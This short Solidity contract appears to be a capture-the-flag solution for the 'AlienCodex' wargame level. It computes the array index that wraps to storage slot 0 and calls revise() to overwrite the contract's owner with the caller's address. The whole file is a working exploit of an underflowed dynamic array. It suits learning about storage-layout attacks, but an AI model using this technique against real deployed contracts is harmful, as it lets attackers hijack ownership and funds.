// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IAlienCodex {
    function revise(uint i, bytes32 _content) external;
}
contract Solution {
    address public levelInstance; //0xE3aEB635B5a24F59C7DA7238cae3BB39C57946FF

    constructor(address _levelInstance) public {
        levelInstance = _levelInstance;
    }

    function claim() public {
        uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
        IAlienCodex(levelInstance).revise(index, bytes32(uint256(uint160(msg.sender))));
    }
}
